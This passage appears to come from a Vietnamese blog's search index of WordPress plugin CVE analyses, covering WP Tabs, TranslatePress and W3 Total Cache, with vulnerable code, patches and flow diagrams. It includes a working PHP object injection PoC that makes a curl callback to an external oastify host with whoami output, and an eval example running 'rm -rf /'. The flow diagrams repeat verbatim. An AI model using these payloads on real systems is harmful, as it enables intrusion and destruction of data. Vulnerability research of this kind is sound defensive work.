qu·∫£\r","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-48134 xu·∫•t ph√°t t·ª´ vi·ªác deserialization d·ªØ li·ªáu kh√¥ng ƒë√°ng tin c·∫≠y th√¥ng qua maybe_unserialize() trong qu√° tr√¨nh import, cho ph√©p PHP Object Injection v√† c√≥ th·ªÉ d·∫´n ƒë·∫øn RCE n·∫øu t·ªìn t·∫°i class nguy hi·ªÉm. D√π y√™u c·∫ßu t√†i kho·∫£n Administrator v√† nonce h·ª£p l·ªá, h·∫≠u qu·∫£ v·∫´n nghi√™m tr·ªçng khi b·ªã khai th√°c. Phi√™n b·∫£n 2.2.13 ƒë√£ s·ª≠a b·∫±ng c√°ch kh√¥ng cho ph√©p t·∫°o object t√πy √Ω khi unserialize. ","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rNguy√™n nh√¢n: deserialization d·ªØ li·ªáu input kh√¥ng ki·ªÉm so√°t. H·∫≠u qu·∫£: Object Injection v√† Remote Code Execution. C·∫ßn quy·ªÅn Administrator ƒë·ªÉ khai th√°c. Kh√¥ng n√™n unserialize d·ªØ li·ªáu ng∆∞·ªùi d√πng n·∫øu kh√¥ng gi·ªõi h·∫°n class ho·∫∑c ki·ªÉm so√°t an to√†n. ","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress WP Tabs Plugin \u003c= 2.2.12 is vulnerable to PHP Object Injection ","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress TranslatePress Plugin.","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Deserialization of Untrusted Data trong Cozmoslabs TranslatePress cho ph√©p Object Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn TranslatePress: t·ª´ n/a cho ƒë·∫øn phi√™n b·∫£n 2.9.6. CVE ID: CVE-2025-30773 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 2.9.6 Patched Versions: 2.9.7 CVSS severity: High (7.2) Required Privilege: Administrator Product: WordPress TranslatePress Plugin ","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - TranslatePress: 2.9.6 ‚Äì vulnerable 2.9.7 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v2.9.6): public function trp_update_database(){ if ( ! current_user_can( apply_filters('trp_update_database_capability', 'manage_options') ) ){ $this-\u003estop_and_print_error( __('Update aborted! Your user account doesn\\'t have the capability to perform database updates.', 'translatepress-multilingual' ) ); } $nonce = isset( $_REQUEST['trp_updb_nonce'] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST['trp_updb_nonce'] ), 'tpupdatedatabase' ) : false; if ( $nonce === false ){ $this-\u003estop_and_print_error( __('Update aborted! Invalid nonce.', 'translatepress-multilingual' ) ); } ... $extra_params = isset( $_REQUEST['trp_updb_extra_params'] ) ? unserialize(base64_decode(sanitize_text_field($_REQUEST['trp_updb_extra_params'] ))) : array(); ... } Trong ƒëo·∫°n m√£ n√†y, h√†m unserialize() ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng ($_REQUEST['trp_updb_extra_params'] sau khi lo·∫°i b·ªè HTML v√† gi·∫£i m√£ base64). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m tr·ªçng: Nguy c∆° Object Injection: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn Object Injection v√† c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi Remote Code Execution (RCE). Thi·∫øu ki·ªÉm tra an to√†n: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize. Kh√¥ng c√≥ c∆° ch·∫ø fallback: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c. B·∫£n v√° (v2.9.7): S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rThay th·∫ø unserialize() b·∫±ng json_decode(): Kh√¥ng c√≤n d√πng unserialize() ‚Üí lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng PHP Object Injection. ","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rH√†m trp_update_database() ki·ªÉm tra xem ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ ph·∫£i Administrator th√¥ng qua: if ( ! current_user_can( apply_filters('trp_update_database_capability', 'manage_options') ) ){ $this-\u003estop_and_print_error( __('Update aborted! Your user account doesn\\'t have the capability to perform database updates.', 'translatepress-multilingual' ) ); } ƒê·ªìng th·ªùi, h√†m c≈©ng x√°c th·ª±c nonce ƒë·ªÉ ngƒÉn ch·∫∑n CSRF: $nonce = isset( $_REQUEST['trp_updb_nonce'] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST['trp_updb_nonce'] ), 'tpupdatedatabase' ) : false; if ( $nonce === false ){ $this-\u003estop_and_print_error( __('Update aborted! Invalid nonce.', 'translatepress-multilingual' ) ); } Trong tr∆∞·ªùng h·ª£p kh√¥ng c√≥ nonce, l·ªó h·ªïng c√≥ th·ªÉ b·ªã khai th√°c b·ªüi Unauthenticated khi admin b·ªã d·ª• truy c·∫≠p v√†o trang c·ªßa attacker, t·ª´ ƒë√≥ tr√¨nh duy·ªát g·ª≠i request k√®m cookie c·ªßa admin, quy·ªÅn manage_options lu√¥n t·ªìn t·∫°i v√† c√°c logic ph√≠a sau s·∫Ω ƒë∆∞·ª£c th·ª±c thi. Khi search v·ªõi t√™n h√†m trp_update_database K·∫øt qu·∫£ search trp_update_database\rtrp_update_database ƒë∆∞·ª£c ƒë·∫∑t l√†m gi√° tr·ªã cho param page =\u003e trp_update_database l√† callback v√† s·∫Ω ƒë∆∞·ª£c g·ªçi khi truy c·∫≠p /wp-admin/admin.php?page=trp_update_database. ","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"]\rB --\u003e C{\"Check capability: current_user_can(manage_options)\"}\rC --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"]\rC --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"]\rD --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"]\rD --\u003e|Pass| E[\"Read trp_updb_extra_params\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"unserialize()\"]\rG --\u003e H{\"Is payload malicious?\"}\rH --\u003e|Yes| R[\"Object Injection ‚Üí Code Execution (RCE)\"]\rH --\u003e|No| S[\"Continue update process normally\"]\rgraph TD\rA[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"]\rB --\u003e C{\"Check capability: current_user_can(manage_options)\"}\rC --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"]\rC --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"]\rD --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"]\rD --\u003e|Pass| E[\"Read trp_updb_extra_params\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"unserialize()\"]\rG --\u003e H{\"Is payload malicious?\"}\rH --\u003e|Yes| R[\"Object Injection ‚Üí Code Execution (RCE)\"]\rH --\u003e|No| S[\"Continue update process normally\"]\rgraph TD\rA[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"]\rB --\u003e C{\"Check capability: current_user_can(manage_options)\"}\rC --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"]\rC --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"]\rD --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"]\rD --\u003e|Pass| E[\"Read trp_updb_extra_params\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"unserialize()\"]\rG --\u003e H{\"Is payload malicious?\"}\rH --\u003e|Yes| R[\"Object Injection ‚Üí Code Execution (RCE)\"]\rH --\u003e|No| S[\"Continue update process normally\"]\rgraph TD\rA[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"]\rB --\u003e C{\"Check capability: current_user_can(manage_options)\"}\rC --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"]\rC --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"]\rD --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"]\rD --\u003e|Pass| E[\"Read trp_updb_extra_params\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"unserialize()\"]\rG --\u003e H{\"Is payload malicious?\"}\rH --\u003e|Yes| R[\"Object Injection ‚Üí Code Execution (RCE)\"]\rH --\u003e|No| S[\"Continue update process normally\"]\r","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o class ƒë·ªÉ test ƒë·∫∑t trong wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Cho request ƒëi qua proxy c·ªßa BurpSuite G·ª≠i l·∫°i request v·ªõi trp_updb_extra_params ch·ª©a chu·ªói serialized ƒë∆∞·ª£c encode base64 trp_updb_extra_params = base64_encode('O:4:\"Evil\":1:{s:7:\"command\";s:75:\"curl http://p8ye6bo0snakjfntwfcv7zvcz35utkh9.oastify.com/?leadked=$(whoami)\";}') POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: administrator_cookie ... action=trp_update_database\u0026trp_updb_nonce=808dff22f9\u0026initiate_update=true\u0026trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NzU6ImN1cmwgaHR0cDovL3A4eWU2Ym8wc25ha2pmbnR3ZmN2N3p2Y3ozNXV0a2g5Lm9hc3RpZnkuY29tLz9sZWFka2VkPSQod2hvYW1pKSI7fQ== K·∫øt qu·∫£\r","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác unserialize() ƒë∆∞·ª£c s·ª≠ d·ª•ng tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng m√† kh√¥ng c√≥ x√°c th·ª±c b·ªï sung, t·∫°o ƒëi·ªÅu ki·ªán cho vi·ªác kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng t√πy √Ω v√† d·∫´n ƒë·∫øn th·ª±c thi m√£ t·ª´ xa n·∫øu payload ƒë·ªôc h·∫°i ƒë∆∞·ª£c cung c·∫•p. Khi k·∫øt h·ª£p v·ªõi kh·∫£ nƒÉng khai th√°c CSRF, admin c√≥ th·ªÉ b·ªã l·ª´a th·ª±c thi payload theo √Ω attacker. Vi·ªác chuy·ªÉn sang json_decode() trong b·∫£n v√° 2.9.7 lo·∫°i b·ªè ho√†n to√†n b·ªÅ m·∫∑t t·∫•n c√¥ng n√†y v√† gi·∫£i quy·∫øt tri·ªát ƒë·ªÉ l·ªó h·ªïng. ","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\runserialize() tr√™n d·ªØ li·ªáu kh√¥ng tin c·∫≠y lu√¥n mang r·ªßi ro Object Injection v√† c√≥ th·ªÉ d·∫´n t·ªõi RCE. C·∫ßn x√°c th·ª±c v√† ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi x·ª≠ l√Ω. CSRF c√≥ th·ªÉ n√¢ng r·ªßi ro t·ª´ ‚ÄúAuthenticated exploit‚Äù th√†nh ‚ÄúSilent exploitation‚Äù. json_decode() l√† l·ª±a ch·ªçn an to√†n h∆°n cho trao ƒë·ªïi d·ªØ li·ªáu gi·ªØa client v√† server. Ki·ªÉm tra diff gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° gi√∫p nhanh ch√≥ng x√°c ƒë·ªãnh nguy√™n nh√¢n v√† ph∆∞∆°ng ph√°p kh·∫Øc ph·ª•c. ","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress TranslatePress Plugin \u003c= 2.9.6 is vulnerable to PHP Object Injection ","date":"2025-11-23","objectID":"/vi/posts/2025-11-23-cve-2025-30773/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/vi/posts/2025-11-23-cve-2025-30773/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress W3 Total Cache Plugin.","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin W3 Total Cache WordPress tr∆∞·ªõc phi√™n b·∫£n 2.8.13 t·ªìn t·∫°i l·ªó h·ªïng command injection th√¥ng qua h√†m _parse_dynamic_mfunc, cho ph√©p ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c th·ª±c thi c√°c l·ªánh PHP b·∫±ng c√°ch g·ª≠i m·ªôt comment ch·ª©a payload ƒë·ªôc h·∫°i v√†o b√†i vi·∫øt. CVE ID: CVE-2025-9501 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 2.8.12 Patched Versions: 2.8.13 CVSS severity: High (9) Required Privilege: Unauthenticated Product: WordPress W3 Total Cache Plugin ","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - W3 Total Cache: 2.8.12 ‚Äì vulnerable 2.8.13 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTheo nh∆∞ m√¥ t·∫£, l·ªó h·ªïng xu·∫•t ph√°t t·ª´ h√†m _parse_dynamic_mfunc public function _parse_dynamic_mfunc( $matches ) { $code1 = trim( $matches[1] ); $code2 = trim( $matches[2] ); $code = ( $code1 ? $code1 : $code2 ); if ( $code ) { $code = trim( $code, ';' ) . ';'; try { ob_start(); $result = eval( $code ); $output = ob_get_contents(); ob_end_clean(); } catch ( \\Exception $ex ) { $result = false; } if ( false === $result ) { $output = sprintf( 'Unable to execute code: %s', htmlspecialchars( $code ) ); } } else { $output = htmlspecialchars( 'Invalid mfunc tag syntax. The correct format is: \u003c!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --\u003e\u003c!-- /mfunc W3TC_DYNAMIC_SECURITY --\u003e or \u003c!-- W3TC_DYNAMIC_SECURITY mfunc --\u003ePHP code\u003c!-- /mfunc W3TC_DYNAMIC_SECURITY --\u003e.' ); } return $output; } H√†m eval() xu·∫•t hi·ªán t·∫°i d√≤ng 11. N√≥ l√† m·ªôt h√†m r·∫•t ƒë·∫∑c bi·ªát v√† nguy hi·ªÉm v√¨ n√≥ cho ph√©p th·ª±c thi m·ªôt chu·ªói PHP nh∆∞ l√† code th·ª±c s·ª±. V√≠ d·ª•: $command = 'system(\"rm -rf /\")'; eval($command); ","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rKhi plugin ƒë∆∞·ª£c install v√† active, n√≥ s·∫Ω th√™m v√†o ƒë·∫ßu d√≤ng c·ªßa wp-config.php \u003c?php /** Enable W3 Total Cache */ define('WP_CACHE', true); // Added by W3 Total Cache ... D√πng ƒë·ªÉ ƒëƒÉng k√≠ t√≠nh nƒÉng cache cho WordPress. WP_CACHE ƒë∆∞·ª£c g·ªçi trong wp-settings.php if ( WP_CACHE \u0026\u0026 apply_filters( 'enable_loading_advanced_cache_dropin', true ) \u0026\u0026 file_exists( WP_CONTENT_DIR . '/advanced-cache.php' ) ) { // For an advanced caching plugin to use. Uses a static drop-in because you would only want one. include WP_CONTENT_DIR . '/advanced-cache.php'; // Re-initialize any hooks added manually by advanced-cache.php. if ( $wp_filter ) { $wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter ); } } WordPress s·∫Ω t·ª± ƒë·ªông load file advanced-cache.php n·∫øu n√≥ t·ªìn t·∫°i. Khi plugin ƒë∆∞·ª£c active th√¨ n√≥ ƒë√£ t·∫°o ra file n√†y: \u003c?php /** * File: advanced-cache.php * * W3 Total Cache advanced cache module. * * @package W3TC */ defined( 'ABSPATH' ) || die(); global $w3tc_start_microtime; $w3tc_start_microtime = microtime( true ); /** * Abort W3TC loading if WordPress is upgrading. */ if ( defined( 'WP_INSTALLING' ) \u0026\u0026 WP_INSTALLING ) { return; } if ( ! defined( 'W3TC_IN_MINIFY' ) ) { if ( ! defined( 'W3TC_DIR' ) ) { define( 'W3TC_DIR', ( defined( 'WP_PLUGIN_DIR' ) ? WP_PLUGIN_DIR : WP_CONTENT_DIR . '/plugins' ) . '/w3-total-cache' ); } if ( ! @is_dir( W3TC_DIR ) || ! file_exists( W3TC_DIR . '/w3-total-cache-api.php' ) ) { if ( defined( 'WP_ADMIN' ) ) { // Only display errors in wp-admin. printf( '\u003cstrong\u003eW3 Total Cache Error:\u003c/strong\u003e some files appear to be missing or out of place. Please re-install plugin or remove \u003cstrong\u003e%s\u003c/strong\u003e. \u003cbr /\u003e', __FILE__ ); } } else { require_once W3TC_DIR . '/w3-total-cache-api.php'; if ( class_exists( '\\W3TC\\Dispatcher' ) ) { $w3tc_redirect = \\W3TC\\Dispatcher::component( 'Mobile_Redirect' ); $w3tc_redirect-\u003eprocess(); $w3tc_config = \\W3TC\\Dispatcher::config(); if ( $w3tc_config-\u003eget_boolean( 'pgcache.enabled' ) ) { $o = \\W3TC\\Dispatcher::component( 'PgCache_ContentGrabber' ); $o-\u003eprocess(); } } } } Khi t√≠nh nƒÉng page cache (pgcache) ƒë∆∞·ª£c b·∫≠t th√¨ $o-\u003eprocess() ƒë·ªÉ x·ª≠ l√≠ logic c·ªßa page cache. Enable page cache\rTrong process(), plugin chu·∫©n b·ªã c∆° ch·∫ø can thi·ªáp v√†o n·ªôi dung trang tr∆∞·ªõc khi tr·∫£ v·ªÅ cho tr√¨nh duy·ªát. public function process() { $this-\u003erun_extensions_dropin(); // Skip caching for some pages. ... Util_Bus::add_ob_callback( 'pagecache', array( $this, 'ob_callback' ) ); } T·∫°i d√≤ng cu·ªëi, h√†m g·ªçi: Util_Bus::add_ob_callback( 'pagecache', array( $this, 'ob_callback' ) ); ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†: Plugin ƒëƒÉng k√Ω m·ªôt callback t√™n pagecache. Callback th·ª±c t·∫ø l√† ph∆∞∆°ng th·ª©c ob_callback c·ªßa object hi·ªán t·∫°i. Callback n√†y s·∫Ω ƒë∆∞·ª£c g·ªçi sau khi WordPress sinh xong HTML, ƒë·ªÉ plugin c√≥ c∆° h·ªôi x·ª≠ l√Ω (nh∆∞ t·ªëi ∆∞u, n√©n, ghi cache‚Ä¶) tr∆∞·ªõc khi g·ª≠i cho tr√¨nh duy·ªát. H√†m add_ob_callback() ch·ªâ l√†m nhi·ªám v·ª• l∆∞u callback l·∫°i ƒë·ªÉ s·ª≠ d·ª•ng v·ªÅ sau: public static function add_ob_callback( $key, $callback ) { $GLOBALS['_w3tc_ob_callbacks'][ $key ] = $callback; } H√†m ob_callback() n√†y ƒë∆∞·ª£c g·ªçi khi output buffer x·∫£ n·ªôi dung HTML ra, v√† n√≥ ki·ªÉm tra xem trang c√≥ ‚Äún·ªôi dung ƒë·ªông‚Äù hay kh√¥ng: public function ob_callback( $buffer ) { ... $has_dynamic = $this-\u003e_has_dynamic( $buffer ); ... // We can't capture output in ob_callback so we use shutdown function. if ( $has_dynamic ) { $this-\u003e_shutdown_buffer = $buffer; $buffer = ''; register_shutdown_function( array( $this, 'shutdown', ) ); } return $buffer; } $buffer l√† to√†n b·ªô HTML m√† WordPress v·ª´a t·∫°o ra. _has_dynamic() ki·ªÉm tra xem trong HTML c√≥ ph·∫ßn n√†o kh√¥ng th·ªÉ cache tr·ª±c ti·∫øp, t·ª©c n√≥ kh√¥ng ƒë∆∞·ª£c c·ªë ƒë·ªãnh: public function _has_dynamic( $buffer ) { if ( ! defined( 'W3TC_DYNAMIC_SECURITY' ) ) { return false; } return preg_match( '~\u003c!--\\s*m(func|clude)\\s*' . W3TC_DYNAMIC_SECURITY . '(.*)--\u003e(.*)\u003c!--\\s*/m(func|clude)\\s*' . W3TC_DYNAMIC_SECURITY . '\\s*--\u003e~Uis', $buffer ); } Theo nh∆∞ t√†i li·ªáu t√¥i t√¨m ƒë∆∞·ª£c th√¨ W3TC_DYNAMIC_SECURITY s·∫Ω ƒë∆∞·ª£c c·∫•u h√¨nh trong wp-config.php n·∫øu mu·ªën s·ª≠ d·ª•ng page fragment caching. define('","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"User requests any front‚Äëend page (unauthenticated)\"]\r--\u003e B[\"WordPress loads wp-settings.php\"]\rB --\u003e C[\"WP_CACHE = true ‚Üí Load advanced-cache.php\"]\rC --\u003e D[\"advanced-cache.php runs Dispatcher\"]\rD --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"]\rE --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"]\rF --\u003e G[\"WordPress renders full HTML into output buffer\"]\rG --\u003e H[\"ob_callback($buffer) triggered\"]\rH --\u003e I{\"_has_dynamic($buffer) ?\"}\rI --\u003e|No| J[\"Return buffer as-is ‚Üí Serve cached page\"]\rI --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"]\rK --\u003e L[\"register_shutdown_function(shutdown)\"]\rL --\u003e M[\"After request completes ‚Üí shutdown()\"]\rM --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"]\rN --\u003e O{\"HTML contains ?\"}\rO --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"]\rP --\u003e Q[\"Extract payload from comment and run eval()\"]\rO --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"]\rQ --\u003e S[\"Output replaced with execution result\"]\rR --\u003e S\rS --\u003e T[\"Page optionally compressed\"]\rT --\u003e U[\"echo back to user\"]\rgraph TD\rA[\"User requests any front‚Äëend page (unauthenticated)\"]\r--\u003e B[\"WordPress loads wp-settings.php\"]\rB --\u003e C[\"WP_CACHE = true ‚Üí Load advanced-cache.php\"]\rC --\u003e D[\"advanced-cache.php runs Dispatcher\"]\rD --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"]\rE --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"]\rF --\u003e G[\"WordPress renders full HTML into output buffer\"]\rG --\u003e H[\"ob_callback($buffer) triggered\"]\rH --\u003e I{\"_has_dynamic($buffer) ?\"}\rI --\u003e|No| J[\"Return buffer as-is ‚Üí Serve cached page\"]\rI --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"]\rK --\u003e L[\"register_shutdown_function(shutdown)\"]\rL --\u003e M[\"After request completes ‚Üí shutdown()\"]\rM --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"]\rN --\u003e O{\"HTML contains ?\"}\rO --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"]\rP --\u003e Q[\"Extract payload from comment and run eval()\"]\rO --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"]\rQ --\u003e S[\"Output replaced with execution result\"]\rR --\u003e S\rS --\u003e T[\"Page optionally compressed\"]\rT --\u003e U[\"echo back to user\"]\rgraph TD\rA[\"User requests any front‚Äëend page (unauthenticated)\"]\r--\u003e B[\"WordPress loads wp-settings.php\"]\rB --\u003e C[\"WP_CACHE = true ‚Üí Load advanced-cache.php\"]\rC --\u003e D[\"advanced-cache.php runs Dispatcher\"]\rD --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"]\rE --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"]\rF --\u003e G[\"WordPress renders full HTML into output buffer\"]\rG --\u003e H[\"ob_callback($buffer) triggered\"]\rH --\u003e I{\"_has_dynamic($buffer) ?\"}\rI --\u003e|No| J[\"Return buffer as-is ‚Üí Serve cached page\"]\rI --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"]\rK --\u003e L[\"register_shutdown_function(shutdown)\"]\rL --\u003e M[\"After request completes ‚Üí shutdown()\"]\rM --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"]\rN --\u003e O{\"HTML contains ?\"}\rO --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"]\rP --\u003e Q[\"Extract payload from comment and run eval()\"]\rO --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"]\rQ --\u003e S[\"Output replaced with execution result\"]\rR --\u003e S\rS --\u003e T[\"Page optionally compressed\"]\rT --\u003e U[\"echo back to user\"]\rgraph TD\rA[\"User requests any front‚Äëend page (unauthenticated)\"]\r--\u003e 